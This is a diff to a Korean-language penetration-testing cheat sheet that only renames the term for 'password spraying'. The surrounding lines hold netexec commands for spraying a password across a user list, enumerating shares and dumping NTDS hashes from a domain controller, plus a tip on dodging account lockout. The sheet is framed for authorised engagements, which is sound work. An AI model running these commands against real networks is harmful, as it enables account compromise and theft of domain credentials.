@@ -22,7 +22,7 @@ flowchart LR
 
 허가된 범위·계약된 대상에서만. 모든 식별자는 예시입니다.
 
-### 인증 분무·접근 확인 — netexec(nxc)
+### 인증 스프레이·접근 확인 — netexec(nxc)
 
 ```bash
 # 한 계정으로 여러 프로토콜 확인
@@ -30,7 +30,7 @@ nxc smb   $DC -u $USER -p 'Password123'
 nxc ldap  $DC -u $USER -p 'Password123' --users
 nxc winrm $DC -u $USER -p 'Password123'
 
-# 계정 목록 분무(성공해도 계속)
+# 계정 목록 스프레이(성공해도 계속)
 nxc smb $TARGET -u users.txt -p 'Password123' --continue-on-success
 
 # 공유·NTDS·LSA
@@ -38,7 +38,7 @@ nxc smb $TARGET -u $USER -p 'Password123' --shares
 nxc smb $DC  -u $USER -p 'Password123' --ntds
 ```
 
-> 판단 포인트: 분무는 **"비밀번호 1개 × 사용자 다수"**가 안전합니다("사용자 1 × 비밀번호 다수"는 잠금 유발). 잠금 정책(`--pass-pol`)을 먼저 확인합니다.
+> 판단 포인트: 스프레이는 **"비밀번호 1개 × 사용자 다수"**가 안전합니다("사용자 1 × 비밀번호 다수"는 잠금 유발). 잠금 정책(`--pass-pol`)을 먼저 확인합니다.
 
 ### 열거 — rpcclient · ldapsearch
 
